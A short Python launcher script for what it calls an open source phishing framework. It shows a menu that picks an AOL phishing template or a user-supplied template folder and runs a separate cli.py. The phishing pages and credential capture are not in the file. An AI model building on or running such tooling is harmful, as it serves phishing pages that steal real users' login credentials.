print('Doom just gave birth to its first child, This is an open source phishing frame work.')
print('creator H0x07')
print('More phishing templates will be added enjoy.')
print('To choose any template, eg Aol press 1 and hit enter\nUse ctrl c to end the program at anytime.\n')
#dooms child
#started 21-Feb-2024
import subprocess
from time import sleep
from threading import Thread
cli = 'cli.py'
def StartCli(template):
   cStart = subprocess.run(['python3', cli, template])
  

def chooseTemplate():
   choice = input('''1. Aol\n00. Use yours\n''')
   if choice == '1':
      Th = Thread(target=StartCli, args=('aol', ))
      Th.start()
   elif choice == '00':
      ur = input("Enter folder name: ")
      Th = Thread(target=StartCli, args=(ur, ))
      Th.start()
      
   else:print(choice)
     
if __name__ == '__main__':
   Th = chooseTemplate()
   
      
         